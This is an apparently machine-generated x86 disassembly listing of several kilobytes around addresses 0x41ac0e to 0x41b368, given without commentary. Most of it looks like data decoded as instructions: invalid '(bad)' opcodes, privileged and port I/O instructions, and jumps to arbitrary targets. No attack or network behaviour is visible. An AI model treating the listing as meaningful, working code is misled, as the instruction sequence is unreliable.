  41ac0e:	shr    BYTE PTR cs:[edx+0x1c3b3c09],0xe2
  41ac16:	in     al,dx
  41ac17:	jmp    0x53c28333
  41ac1c:	ret    0xb106
  41ac1f:	outs   dx,DWORD PTR ds:[esi]
  41ac20:	idiv   BYTE PTR [edi-0x6d]
  41ac23:	lods   al,BYTE PTR ds:[esi]
  41ac24:	out    dx,eax
  41ac25:	leave  
  41ac26:	dec    esi
  41ac27:	mov    ebp,0x4767c49b
  41ac2c:	inc    esi
  41ac2d:	into   
  41ac2e:	sbb    eax,0x9405e52a
  41ac33:	icebp  
  41ac34:	or     BYTE PTR [edx+edx*4],dl
  41ac37:	ret    0xf3d0
  41ac3a:	fidiv  DWORD PTR [edx+0x7b8ceee]
  41ac40:	test   DWORD PTR [ebx],esp
  41ac42:	jp     0x41aca2
  41ac44:	inc    edx
  41ac45:	stos   DWORD PTR es:[edi],eax
  41ac46:	dec    eax
  41ac47:	pop    ecx
  41ac48:	test   al,0x90
  41ac4a:	aas    
  41ac4b:	sub    eax,0x6d1fd508
  41ac50:	cmp    al,BYTE PTR [edi+0x4d]
  41ac53:	mov    ebx,0xf9cad9f1
  41ac58:	dec    ecx
  41ac59:	int3   
  41ac5a:	xchg   esi,eax
  41ac5b:	inc    esi
  41ac5c:	loopne 0x41ac0b
  41ac5e:	inc    esi
  41ac5f:	shl    BYTE PTR [ebx*2+0x3a6085d7],0x7a
  41ac67:	fld    QWORD PTR [edi+0x3c027ae8]
  41ac6d:	add    DWORD PTR [ebx+0x337adee4],ebx
  41ac73:	ins    DWORD PTR es:[edi],dx
  41ac74:	sub    esi,0x31
  41ac77:	inc    esp
  41ac78:	pop    esi
  41ac79:	and    al,0x95
  41ac7b:	sbb    ah,al
  41ac7d:	sbb    DWORD PTR [ebx],edi
  41ac7f:	inc    esp
  41ac80:	inc    ebx
  41ac81:	out    dx,al
  41ac82:	xchg   ebp,eax
  41ac83:	loop   0x41acb4
  41ac85:	pop    esi
  41ac86:	fs cs push eax
  41ac89:	dec    edi
  41ac8a:	push   esp
  41ac8b:	and    eax,0x7ab248ce
  41ac90:	(bad)  
  41ac91:	mov    edi,0x46278da5
  41ac96:	fdivr  DWORD PTR es:[ebx-0x6f]
  41ac9a:	loope  0x41ac85
  41ac9c:	mov    esp,0xde5f047a
  41aca1:	add    cl,BYTE PTR [ecx]
  41aca3:	adc    DWORD PTR [edi+0x49ba9905],eax
  41aca9:	sbb    ecx,eax
  41acab:	aaa    
  41acac:	fdivrp st(6),st
  41acae:	mov    eax,0x82bcf0bd
  41acb3:	mov    eax,0x8171d375
  41acb8:	ins    DWORD PTR es:[edi],dx
  41acb9:	lahf   
  41acba:	mov    eax,ds:0x3fed1f63
  41acbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc0:	sub    BYTE PTR [edx+0x206e4121],bl
  41acc6:	test   BYTE PTR ds:0xdcd0f5c7,dl
  41accc:	shl    ebp,0x44
  41accf:	mov    bl,0xfb
  41acd1:	inc    ecx
  41acd2:	popf   
  41acd3:	adc    BYTE PTR [esp+esi*4-0x18cb7113],cl
  41acda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acdb:	loope  0x41ac8d
  41acdd:	sar    esp,0x92
  41ace0:	mov    bl,0xeb
  41ace2:	mov    eax,0xa144bf3a
  41ace7:	mov    ds:0x6e9595fb,al
  41acec:	inc    ecx
  41aced:	mov    dl,0x7e
  41acef:	(bad)  
  41acf0:	out    dx,al
  41acf1:	les    esp,FWORD PTR [ecx+0x22b38f9a]
  41acf7:	mov    al,ds:0x7db52cd5
  41acfc:	scas   al,BYTE PTR es:[edi]
  41acfd:	and    al,0x4d
  41acff:	cmp    DWORD PTR [esp+edx*8-0x1fe4aa69],0xe5176368
  41ad0a:	jno    0x41ad36
  41ad0c:	jo     0x41ad85
  41ad0e:	stos   BYTE PTR es:[edi],al
  41ad0f:	ins    DWORD PTR es:[edi],dx
  41ad10:	addr16 push ecx
  41ad12:	in     al,dx
  41ad13:	lea    edx,[ebx]
  41ad15:	cwde   
  41ad16:	mov    al,ds:0xf0b24f65
  41ad1b:	cmp    dl,BYTE PTR [esi+0x42f3e55b]
  41ad21:	xchg   DWORD PTR [esi-0x513bb590],esp
  41ad27:	adc    dh,dl
  41ad29:	sbb    ebp,DWORD PTR [ecx-0x28e325cb]
  41ad2f:	push   es
  41ad30:	lds    eax,FWORD PTR [eax-0x1]
  41ad33:	jge    0x41ace5
  41ad35:	mov    bh,dl
  41ad37:	sahf   
  41ad38:	cdq    
  41ad39:	sbb    al,0xff
  41ad3b:	hlt    
  41ad3c:	clc    
  41ad3d:	push   eax
  41ad3e:	cwde   
  41ad3f:	and    ch,BYTE PTR [eax-0x3bf8577e]
  41ad45:	and    eax,esi
  41ad47:	iret   
  41ad48:	push   ds
  41ad49:	iret   
  41ad4a:	fwait
  41ad4b:	push   es
  41ad4c:	pop    edx
  41ad4d:	test   esp,0x3b2c0926
  41ad53:	(bad)  
  41ad54:	push   cs
  41ad55:	inc    ebx
  41ad56:	arpl   WORD PTR [edi-0x1c],ax
  41ad59:	push   ebx
  41ad5a:	addr16 inc edx
  41ad5c:	ret    0xe1c0
  41ad5f:	div    DWORD PTR [edi+0x5c71c2b0]
  41ad65:	out    0x86,eax
  41ad67:	mov    ebx,0x30b5632c
  41ad6c:	xchg   edi,eax
  41ad6d:	push   cs
  41ad6e:	outs   dx,BYTE PTR ds:[esi]
  41ad6f:	cmc    
  41ad70:	popf   
  41ad71:	int3   
  41ad72:	sub    al,0xa1
  41ad74:	jne    0x41ad46
  41ad76:	cmc    
  41ad77:	xchg   dl,ch
  41ad79:	jp     0x41adc3
  41ad7b:	mov    edi,0xc17cb442
  41ad80:	repnz mov ds:0xa79f7bde,al
  41ad86:	mov    bl,0x19
  41ad88:	xor    BYTE PTR [eax],ah
  41ad8a:	frstor [eax+0x49618b02]
  41ad90:	sti    
  41ad91:	js     0x41ad9c
  41ad93:	adc    edx,ebp
  41ad95:	pop    ecx
  41ad96:	mov    ds:0x2c458ef,eax
  41ad9b:	xor    dh,BYTE PTR [ecx]
  41ad9d:	cmp    eax,eax
  41ad9f:	loope  0x41ad46
  41ada1:	in     eax,0x44
  41ada3:	mov    dh,0x92
  41ada5:	push   edi
  41ada6:	ds push ss
  41ada8:	in     al,0xba
  41adaa:	sahf   
  41adab:	sub    BYTE PTR ds:[esi],al
  41adae:	and    al,0xda
  41adb0:	mov    esp,edi
  41adb2:	loop   0x41ad6e
  41adb4:	in     eax,dx
  41adb5:	adc    BYTE PTR ds:0x8c49db9e,dh
  41adbb:	jecxz  0x41ade8
  41adbd:	nop
  41adbe:	sub    eax,edi
  41adc0:	inc    edi
  41adc1:	xchg   ebx,eax
  41adc2:	xlat   BYTE PTR ds:[ebx]
  41adc3:	sbb    al,0x40
  41adc5:	push   0x76
  41adc7:	pop    ebp
  41adc8:	or     DWORD PTR [esi+0x2c99b717],ebp
  41adce:	in     al,dx
  41adcf:	retf   
  41add0:	add    eax,0x9d54380c
  41add5:	mov    cl,0xc2
  41add7:	and    eax,ebp
  41add9:	cmp    ebx,edx
  41addb:	mov    eax,DWORD PTR [ecx]
  41addd:	in     al,0x5f
  41addf:	ins    DWORD PTR es:[edi],dx
  41ade0:	jle    0x41ad6b
  41ade2:	pop    ebx
  41ade3:	inc    eax
  41ade4:	push   ds
  41ade5:	xchg   ecx,eax
  41ade6:	stc    
  41ade7:	aam    0x60
  41ade9:	and    BYTE PTR [ecx+0x784da23d],bl
  41adef:	jmp    0x41ad75
  41adf1:	cwde   
  41adf2:	lods   eax,DWORD PTR ds:[esi]
  41adf3:	pop    es
  41adf4:	daa    
  41adf5:	pop    esi
  41adf6:	stos   BYTE PTR es:[edi],al
  41adf7:	lods   eax,DWORD PTR ds:[esi]
  41adf8:	out    0x7e,eax
  41adfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfb:	ror    DWORD PTR [ebx],cl
  41adfd:	mov    ebx,0xb929a928
  41ae02:	mov    al,ds:0xc649f770
  41ae07:	das    
  41ae08:	adc    eax,0x5ee2172
  41ae0d:	mov    WORD PTR [edi+0x20],ds
  41ae10:	inc    eax
  41ae11:	pop    ebp
  41ae12:	cmp    DWORD PTR [ecx+0x4a86c7a2],edi
  41ae18:	mov    bh,0xd6
  41ae1a:	cmp    al,0x9f
  41ae1c:	xor    edx,ebx
  41ae1e:	jo     0x41ae36
  41ae20:	xor    ah,BYTE PTR [eax-0x53]
  41ae23:	push   edi
  41ae24:	shl    dh,cl
  41ae26:	mov    ds:0x64c59254,al
  41ae2b:	and    DWORD PTR [ebx-0x115c8005],ebp
  41ae31:	and    al,0x42
  41ae33:	data16 clc 
  41ae35:	mov    edi,DWORD PTR [ebp-0x3e]
  41ae38:	or     eax,0x413b218
  41ae3d:	dec    esi
  41ae3e:	mov    WORD PTR [ecx+ebp*2-0x3aeb39b],es
  41ae45:	cli    
  41ae46:	xor    eax,0x65f09018
  41ae4b:	test   al,0x55
  41ae4d:	fwait
  41ae4e:	out    dx,al
  41ae4f:	lods   al,BYTE PTR ds:[esi]
  41ae50:	(bad)  [ebx+ebp*1+0x60]
  41ae54:	mov    ebp,edx
  41ae56:	xchg   dl,bh
  41ae58:	xchg   edi,eax
  41ae59:	xor    al,0xba
  41ae5b:	movlps QWORD PTR [ecx+0xf],xmm2
  41ae5f:	push   es
  41ae60:	add    bl,BYTE PTR [ecx+edi*1]
  41ae63:	pop    es
  41ae64:	ja     0x41ae51
  41ae66:	push   es
  41ae67:	dec    esp
  41ae68:	mov    al,0xcf
  41ae6a:	mov    edi,0xbb269501
  41ae6f:	das    
  41ae70:	fwait
  41ae71:	push   ds
  41ae72:	push   ds
  41ae73:	pop    es
  41ae74:	imul   edi,DWORD PTR [eax-0x75],0xffffff8d
  41ae78:	or     esi,DWORD PTR [ecx-0x71]
  41ae7b:	sub    BYTE PTR [ecx+0x23],dl
  41ae7e:	mov    ecx,0x159bede6
  41ae83:	lods   eax,DWORD PTR ds:[esi]
  41ae84:	aas    
  41ae85:	and    BYTE PTR [ebx],bl
  41ae87:	dec    edi
  41ae88:	iret   
  41ae89:	and    DWORD PTR [edx-0x53],esp
  41ae8c:	popf   
  41ae8d:	or     cl,bl
  41ae8f:	les    ebx,FWORD PTR fs:[eax+ebp*1]
  41ae93:	xchg   edx,eax
  41ae94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae95:	std    
  41ae96:	adc    esp,eax
  41ae98:	push   ebp
  41ae99:	hlt    
  41ae9a:	ja     0x41ae6b
  41ae9c:	cmc    
  41ae9d:	push   ebp
  41ae9e:	das    
  41ae9f:	inc    edi
  41aea0:	sub    al,0x53
  41aea3:	xchg   edi,ebp
  41aea5:	xor    bh,BYTE PTR [esi+0x271ab688]
  41aeab:	das    
  41aeac:	(bad)  
  41aead:	in     al,dx
  41aeae:	test   al,0x8c
  41aeb0:	test   BYTE PTR [esp+ebx*2+0x797cee44],ah
  41aeb7:	pusha  
  41aeb8:	jo     0x41aeb9
  41aeba:	aas    
  41aebb:	jno    0x41af09
  41aebd:	cmp    eax,0xdfc1845f
  41aec2:	pop    ebx
  41aec3:	and    eax,0xf0749e70
  41aec8:	mov    ds:0x1c2f1561,eax
  41aecd:	and    eax,0xcf422e91
  41aed2:	push   esp
  41aed3:	not    edi
  41aed5:	retf   
  41aed6:	cdq    
  41aed7:	or     eax,0x3d85a2c6
  41aedc:	push   edx
  41aedd:	neg    DWORD PTR fs:[esi]
  41aee0:	imul   BYTE PTR [esi]
  41aee2:	stc    
  41aee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aee4:	push   esi
  41aee5:	fiadd  WORD PTR [ecx-0x2e]
  41aee8:	jmp    0xeb92:0x5c347b32
  41aeef:	rol    BYTE PTR [ebp-0x4f9bb60f],1
  41aef5:	push   ss
  41aef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef7:	push   eax
  41aef8:	sbb    DWORD PTR [edx-0x36],ecx
  41aefb:	fild   QWORD PTR [ecx+0x1a]
  41aefe:	out    dx,eax
  41aeff:	popf   
  41af00:	jns    0x41aea5
  41af02:	retf   0xd6c5
  41af05:	inc    ecx
  41af06:	test   bh,0x77
  41af09:	xchg   BYTE PTR [edx+ebp*8+0x636129b9],al
  41af10:	dec    edx
  41af11:	das    
  41af12:	inc    ebx
  41af13:	dec    esp
  41af14:	fisttp DWORD PTR [ebp+ecx*8+0x4b]
  41af18:	cmp    eax,0x2ae35bbe
  41af1d:	mov    cl,0xeb
  41af1f:	push   0xcfe05f80
  41af24:	rcl    DWORD PTR [eax+0x57],cl
  41af27:	sub    BYTE PTR [esi+0x1de24dd1],bl
  41af2d:	lods   al,BYTE PTR ds:[esi]
  41af2e:	sub    ebx,ebx
  41af30:	jb     0x41af00
  41af32:	add    BYTE PTR [eax+0x3b133360],cl
  41af38:	test   BYTE PTR [eax-0x69770f5d],ah
  41af3e:	mov    ds:0x1808be5d,al
  41af43:	add    al,0x68
  41af45:	dec    si
  41af47:	clts   
  41af49:	or     esp,ebp
  41af4b:	rcr    edx,cl
  41af4d:	adc    eax,0xf21caabd
  41af52:	into   
  41af53:	cli    
  41af54:	inc    ebp
  41af55:	mov    dh,0xe4
  41af57:	fisubr WORD PTR [eax+edx*2]
  41af5a:	mov    eax,0x13b3f78f
  41af5f:	xor    eax,0xafa5ce67
  41af64:	cld    
  41af65:	xlat   BYTE PTR ds:[ebx]
  41af66:	(bad)  
  41af67:	mov    eax,0xd722c563
  41af6c:	sub    DWORD PTR [eax+0x3],esp
  41af6f:	(bad)  
  41af70:	cmp    DWORD PTR [esp+ebx*1-0x4b],esp
  41af74:	inc    edi
  41af75:	inc    esi
  41af76:	xchg   esp,eax
  41af77:	(bad)
  41af7a:	cwde   
  41af7b:	aas    
  41af7c:	shr    DWORD PTR [esi-0x3f44912],0x8f
  41af83:	adc    BYTE PTR [eax+0x65237bf9],ch
  41af89:	push   esp
  41af8a:	jge    0x41afa7
  41af8c:	aaa    
  41af8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af8e:	cmp    eax,0x294fca61
  41af93:	pop    ebp
  41af94:	and    edi,esi
  41af96:	(bad)  
  41af97:	out    dx,eax
  41af98:	add    edi,DWORD PTR [ebp+edx*4-0x42cd852b]
  41af9f:	push   esi
  41afa0:	sub    cl,BYTE PTR [esi-0x4a]
  41afa3:	das    
  41afa4:	and    DWORD PTR [esi],eax
  41afa6:	jnp    0x41af62
  41afa8:	push   ebx
  41afa9:	cwde   
  41afaa:	adc    al,0xbd
  41afac:	outs   dx,BYTE PTR ds:[esi]
  41afad:	add    al,0xcf
  41afaf:	imul   eax,DWORD PTR [esi],0x2273edeb
  41afb5:	adc    al,0xf3
  41afb7:	in     al,dx
  41afb8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afba:	xchg   ebx,eax
  41afbb:	push   ebp
  41afbc:	es inc eax
  41afbe:	scas   al,BYTE PTR es:[edi]
  41afbf:	adc    ch,BYTE PTR [ecx-0x134a3a13]
  41afc5:	xor    al,BYTE PTR [eax]
  41afc7:	stc    
  41afc8:	cmp    esp,ebp
  41afca:	dec    esi
  41afcb:	or     al,0xbc
  41afcd:	jmp    0xd96a:0x527e3ef2
  41afd4:	push   ecx
  41afd5:	xchg   edx,eax
  41afd6:	out    dx,eax
  41afd7:	xor    edi,edx
  41afd9:	cmp    eax,DWORD PTR [edx+esi*1]
  41afdc:	xchg   esi,eax
  41afdd:	adc    eax,0x1892dcd
  41afe2:	arpl   bp,ax
  41afe4:	xchg   edx,eax
  41afe5:	gs lock rol edx,cl
  41afe9:	cmp    bl,dl
  41afeb:	adc    BYTE PTR [eax],dl
  41afed:	xor    al,0x79
  41afef:	xor    edi,DWORD PTR [edi-0x49]
  41aff2:	mov    BYTE PTR [eax],dl
  41aff4:	aad    0x71
  41aff6:	test   al,0x99
  41aff8:	call   0xd19e2be7
  41affd:	add    DWORD PTR [ebx+0x16afb610],ebx
  41b003:	xchg   ebx,eax
  41b004:	and    bh,BYTE PTR [edi+ebx*4-0x3]
  41b008:	xor    esp,DWORD PTR [edi+0x2fe1da25]
  41b00e:	mov    ah,0x78
  41b010:	mov    ebp,0x9bc5ba63
  41b015:	test   eax,0xa04745bf
  41b01a:	inc    esi
  41b01b:	sub    al,0x5c
  41b01d:	mov    WORD PTR [edi-0x73],cs
  41b020:	rcr    edi,0xee
  41b023:	pop    ebp
  41b024:	loopne 0x41b074
  41b026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b027:	and    eax,0x16c92bf
  41b02c:	mov    edi,0xf7a66733
  41b031:	aaa    
  41b032:	push   0x54
  41b034:	or     edi,DWORD PTR [edx-0x23cd055d]
  41b03a:	test   eax,0x81c77dc7
  41b03f:	into   
  41b040:	ret    
  41b041:	mov    dh,BYTE PTR [edi]
  41b043:	hlt    
  41b044:	bound  edi,QWORD PTR [edi]
  41b046:	(bad)  
  41b047:	test   eax,0xfc237e9a
  41b04c:	inc    ebp
  41b04d:	bound  ebx,QWORD PTR [esi]
  41b04f:	retf   0xabbc
  41b052:	jbe    0x41b051
  41b054:	into   
  41b055:	stc    
  41b056:	loope  0x41b090
  41b058:	test   BYTE PTR [edi-0x751a3ab5],0x20
  41b05f:	shl    bh,1
  41b061:	sbb    eax,0x5ba7e8ab
  41b066:	fbld   TBYTE PTR ds:0x62d41945
  41b06c:	cmc    
  41b06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b06e:	loopne 0x41b0c4
  41b070:	jae    0x41b095
  41b072:	push   esi
  41b073:	and    esi,ebp
  41b075:	push   ds
  41b076:	dec    edx
  41b077:	shl    bh,cl
  41b079:	pop    ebx
  41b07a:	imul   ebp,DWORD PTR [edx+0x3a],0x9f708bb4
  41b081:	popa   
  41b082:	jmp    0x29acaa91
  41b087:	out    0x83,eax
  41b089:	mov    ah,BYTE PTR [eax+0x2f]
  41b08c:	frstor [edx+0x2d70b611]
  41b092:	pop    ds
  41b093:	rcr    BYTE PTR [ebx+edx*8-0x38],0x0
  41b098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b099:	retf   0xf11
  41b09c:	jg     0x41b0d2
  41b09e:	adc    al,0x1a
  41b0a0:	mov    DWORD PTR [ebx-0x1240bf55],ebx
  41b0a6:	loope  0x41b105
  41b0a8:	cmp    BYTE PTR [ebp+0x60b63a5f],dl
  41b0ae:	pop    esp
  41b0af:	scas   eax,DWORD PTR es:[edi]
  41b0b0:	jp     0x41b127
  41b0b2:	dec    ebx
  41b0b3:	mov    al,ds:0x105ba76d
  41b0b8:	popa   
  41b0b9:	pop    esp
  41b0ba:	int3   
  41b0bb:	(bad)  [ebp+0x38]
  41b0be:	push   eax
  41b0bf:	push   ebp
  41b0c0:	(bad)  
  41b0c1:	jle    0x41b13a
  41b0c3:	or     ebp,DWORD PTR [ecx+ecx*8-0x539987b2]
  41b0ca:	dec    ecx
  41b0cb:	and    al,0x67
  41b0cd:	daa    
  41b0ce:	stos   BYTE PTR es:[edi],al
  41b0cf:	cmp    eax,0xaf4dcae5
  41b0d4:	mov    bh,0xb7
  41b0d6:	(bad)  
  41b0d7:	retf   0x12b8
  41b0da:	rcr    dh,cl
  41b0dc:	mov    ch,0xfb
  41b0de:	jns    0x41b066
  41b0e0:	lahf   
  41b0e1:	inc    esi
  41b0e2:	xchg   esp,eax
  41b0e3:	mov    edx,0x4ddd1cb2
  41b0e8:	or     ebx,DWORD PTR [esi+eax*2-0x4f28a1fe]
  41b0ef:	fsub   QWORD PTR [esi+0x44a06f79]
  41b0f5:	cmp    DWORD PTR [eax],ecx
  41b0f7:	xchg   ebp,eax
  41b0f8:	cs inc esi
  41b0fb:	jmp    0x41b0cd
  41b0fd:	addr16 pop esp
  41b0ff:	add    al,0x71
  41b101:	pop    edi
  41b102:	xchg   edx,eax
  41b103:	or     DWORD PTR [edx-0x3655ecf5],esp
  41b109:	mov    eax,ds:0x4eb6421
  41b10e:	je     0x41b112
  41b110:	repz xchg ebx,eax
  41b112:	in     eax,0x64
  41b114:	sbb    bl,BYTE PTR [ebx]
  41b116:	je     0x41b196
  41b118:	add    DWORD PTR [edx+0x63],ebp
  41b11b:	lock push es
  41b11d:	mov    si,0xbb12
  41b121:	jns    0x41b0ca
  41b123:	lea    esi,[ebp+0x35]
  41b126:	(bad)  
  41b127:	jmp    0x41b0d3
  41b129:	cmp    BYTE PTR [edx-0x3b193949],0xd2
  41b130:	add    eax,0x2f979118
  41b135:	inc    esp
  41b136:	jno    0x41b0e2
  41b138:	cmp    al,0xe9
  41b13a:	mov    ds:0x46198b11,al
  41b13f:	stos   BYTE PTR es:[edi],al
  41b140:	not    DWORD PTR cs:[ecx+0x54]
  41b144:	aaa    
  41b145:	jnp    0x41b1ab
  41b147:	mov    BYTE PTR ds:0x50c1fa2b,bh
  41b14d:	rcr    BYTE PTR [esi],1
  41b14f:	jmp    0x41b113
  41b151:	xchg   DWORD PTR [edi-0x7f6805b7],esi
  41b157:	pop    ebp
  41b158:	mov    ds:0x80eb5083,eax
  41b15d:	jmp    0x41b1c5
  41b15f:	cmp    BYTE PTR [ebx],al
  41b161:	dec    esp
  41b162:	jl     0x41b1ba
  41b164:	lahf   
  41b165:	jle    0x41b13e
  41b167:	stos   BYTE PTR es:[edi],al
  41b168:	xor    dl,ch
  41b16a:	ret    0x6cbf
  41b16d:	or     al,0x9b
  41b16f:	mov    eax,0xe67f9e10
  41b174:	or     eax,0x769d96ad
  41b179:	add    BYTE PTR [ecx],0xa2
  41b17c:	clc    
  41b17d:	push   0x0
  41b17f:	xchg   ch,dh
  41b181:	mov    DWORD PTR [ecx],esp
  41b183:	sbb    ch,BYTE PTR [ebx-0x20]
  41b186:	xchg   edx,eax
  41b187:	pop    ebx
  41b188:	(bad)  
  41b189:	add    edx,0xffffffba
  41b18c:	dec    esp
  41b18d:	mov    eax,ds:0x3a7db971
  41b192:	push   0x38247d21
  41b197:	push   esi
  41b198:	dec    edi
  41b199:	pusha  
  41b19a:	add    al,BYTE PTR [ebp+ecx*1+0x343bfb67]
  41b1a1:	sub    DWORD PTR [ebx],edx
  41b1a3:	std    
  41b1a4:	pop    edx
  41b1a5:	sub    BYTE PTR [edi-0x35c31db9],al
  41b1ab:	mov    DWORD PTR [esi+0x60710052],eax
  41b1b1:	es dec esi
  41b1b3:	cmp    bl,BYTE PTR [edi-0x632264bb]
  41b1b9:	lock xchg edx,eax
  41b1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1bc:	imul   esp,DWORD PTR [ebx],0xffffffc7
  41b1bf:	add    al,0xaf
  41b1c1:	jns    0x41b1c7
  41b1c3:	pop    ebx
  41b1c4:	hlt    
  41b1c5:	dec    eax
  41b1c6:	xchg   esi,eax
  41b1c7:	or     al,0xd9
  41b1c9:	sub    edx,DWORD PTR [ebp+0x34]
  41b1cc:	and    eax,0x4f10b47
  41b1d1:	adc    esp,DWORD PTR [esi-0x11]
  41b1d4:	in     eax,0x90
  41b1d6:	add    edi,DWORD PTR [edx+ebp*8]
  41b1d9:	mov    al,ds:0x4bacba
  41b1de:	addr16 lahf 
  41b1e0:	push   esi
  41b1e1:	dec    ecx
  41b1e2:	sub    eax,0x3cd11530
  41b1e7:	stc    
  41b1e8:	push   esp
  41b1e9:	add    edi,DWORD PTR fs:[edi]
  41b1ec:	stc    
  41b1ed:	stos   DWORD PTR es:[edi],eax
  41b1ee:	repz xor cl,BYTE PTR [esi-0x36cf826]
  41b1f5:	mov    dl,0x92
  41b1f7:	pop    es
  41b1f8:	in     eax,dx
  41b1f9:	ds push esp
  41b1fb:	xchg   esi,eax
  41b1fc:	jns    0x41b21f
  41b1fe:	or     eax,0xdfa00aa3
  41b203:	lods   eax,DWORD PTR ds:[esi]
  41b204:	adc    ebx,DWORD PTR [edi+eiz*1+0x4e]
  41b208:	enter  0x39e1,0xa
  41b20c:	push   ebx
  41b20d:	xchg   esi,eax
  41b20e:	push   ebx
  41b20f:	inc    edi
  41b210:	pop    edi
  41b211:	push   edi
  41b212:	add    al,0xe4
  41b214:	outs   dx,BYTE PTR ds:[esi]
  41b215:	pop    es
  41b216:	call   0xdd1646d
  41b21b:	fsub   QWORD PTR [ecx-0x25]
  41b21e:	in     al,0xe3
  41b220:	lds    edi,FWORD PTR [edx-0x46]
  41b223:	jmp    0x4628:0x61fe0b61
  41b22a:	sub    BYTE PTR [ecx],bh
  41b22c:	xlat   BYTE PTR es:[ebx]
  41b22e:	loop   0x41b241
  41b230:	popa   
  41b231:	add    al,0x4e
  41b233:	data16 in al,0x27
  41b236:	mov    al,0x70
  41b238:	pop    esi
  41b239:	cmp    dh,BYTE PTR [edx+0x33]
  41b23c:	dec    esi
  41b23d:	inc    ebx
  41b23e:	div    al
  41b240:	sub    eax,0x26c236ac
  41b245:	pop    es
  41b246:	cmp    al,0x5
  41b248:	ret    0x6b52
  41b24b:	jnp    0x41b2a9
  41b24d:	inc    esp
  41b24e:	xor    al,0xf5
  41b250:	add    DWORD PTR [ebx-0x19b69ff4],edi
  41b256:	test   bl,ah
  41b258:	bound  ebx,QWORD PTR [ecx-0x71]
  41b25b:	push   edx
  41b25c:	sbb    esp,ebx
  41b25e:	fisttp WORD PTR [ecx+ecx*8+0x1e]
  41b262:	test   BYTE PTR [ecx],al
  41b264:	cmp    bh,BYTE PTR [edi-0x4e]
  41b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b268:	cwde   
  41b269:	mov    edx,0xbf70f760
  41b26e:	les    ecx,FWORD PTR [ebp-0x28]
  41b271:	sahf   
  41b272:	in     eax,dx
  41b273:	inc    edx
  41b274:	mov    dh,0x68
  41b276:	jb     0x41b26f
  41b278:	ret    
  41b279:	retf   0xa13c
  41b27c:	imul   esp,DWORD PTR [ebx+0x9f4d62a],0x3e05621e
  41b286:	pushw  ss
  41b288:	and    eax,edx
  41b28a:	cs leave 
  41b28c:	or     eax,0xd4a87661
  41b291:	jge    0x41b26e
  41b293:	rcr    BYTE PTR [esp+eiz*2],1
  41b296:	pop    ds
  41b297:	rcl    BYTE PTR [edi],0xc8
  41b29a:	test   BYTE PTR [edi],bh
  41b29c:	or     eax,0x8d657bfa
  41b2a1:	push   eax
  41b2a2:	cmp    al,0xa4
  41b2a4:	cmp    ah,ah
  41b2a6:	in     eax,dx
  41b2a7:	and    bh,BYTE PTR [eax]
  41b2a9:	fiadd  DWORD PTR [esi+0x22ff1295]
  41b2af:	dec    esi
  41b2b0:	pop    es
  41b2b1:	pop    esp
  41b2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b3:	fldenv [edx-0x66]
  41b2b6:	jge    0x41b31f
  41b2b8:	mov    eax,0xccc541eb
  41b2bd:	xchg   edx,eax
  41b2be:	lods   eax,DWORD PTR ds:[esi]
  41b2bf:	loopne 0x41b2b7
  41b2c1:	in     al,dx
  41b2c2:	data16 int3 
  41b2c4:	xchg   DWORD PTR [eax+0x7],ebp
  41b2c7:	xchg   edx,eax
  41b2c8:	aad    0x45
  41b2ca:	mov    bl,0x37
  41b2cc:	adc    BYTE PTR [ebp+0x5e],al
  41b2cf:	or     al,ah
  41b2d1:	add    cl,BYTE PTR [ebx+eiz*1+0x11]
  41b2d5:	adc    DWORD PTR [ebp+edx*4-0x52f84c66],edx
  41b2dc:	gs (bad) 
  41b2de:	mov    bh,0x4c
  41b2e0:	mov    bh,0xd1
  41b2e2:	jmp    0x41b2fc
  41b2e4:	inc    edx
  41b2e5:	ret    
  41b2e6:	shr    BYTE PTR [esi+esi*8+0x22],0xf9
  41b2eb:	jno    0x41b26d
  41b2ed:	arpl   dx,bp
  41b2ef:	pop    dx
  41b2f1:	rcr    dl,1
  41b2f3:	outs   dx,DWORD PTR ds:[esi]
  41b2f4:	inc    esi
  41b2f5:	fmul   QWORD PTR [edx+0x6a]
  41b2f8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b2fa:	ja     0x41b326
  41b2fc:	xor    ch,BYTE PTR [ebx-0x80]
  41b2ff:	bound  ecx,QWORD PTR ds:0xac5dfa3e
  41b305:	fwait
  41b306:	push   ebx
  41b307:	jo     0x41b2dd
  41b309:	or     ecx,DWORD PTR ds:0xebcd5af2
  41b30f:	sub    BYTE PTR [ebx],0x5a
  41b312:	test   BYTE PTR [ecx],al
  41b314:	test   eax,0x362a2417
  41b319:	sar    BYTE PTR [eax],cl
  41b31b:	adc    eax,0x2adb550f
  41b320:	ins    DWORD PTR es:[edi],dx
  41b321:	ja     0x41b35a
  41b323:	mov    ecx,0x52103539
  41b328:	mov    bh,0xbe
  41b32a:	adc    BYTE PTR [ecx-0x511eaacc],al
  41b330:	xchg   ebx,eax
  41b331:	(bad)  
  41b332:	sti    
  41b333:	call   0x9907:0x1841a242
  41b33a:	fistp  QWORD PTR [esi]
  41b33c:	pushf  
  41b33d:	in     eax,dx
  41b33e:	outs   dx,BYTE PTR ds:[esi]
  41b33f:	or     dl,cl
  41b341:	stc    
  41b342:	mov    edi,eax
  41b344:	mov    ecx,0xeb2f1d7
  41b349:	mov    ebx,0xd1bcf7d1
  41b34e:	out    dx,eax
  41b34f:	inc    esi
  41b350:	xchg   ecx,eax
  41b351:	dec    ecx
  41b352:	std    
  41b353:	aas    
  41b354:	jnp    0x41b3c0
  41b356:	test   BYTE PTR [ebx+0x38],ah
  41b359:	test   eax,0x664a5d92
  41b35e:	imul   ebx,DWORD PTR [eax],0xf5a5dd1a
  41b364:	ja     0x41b339
  41b366:	fcmovnbe st,st(5)
  41b368:	xchg   ebp,eax
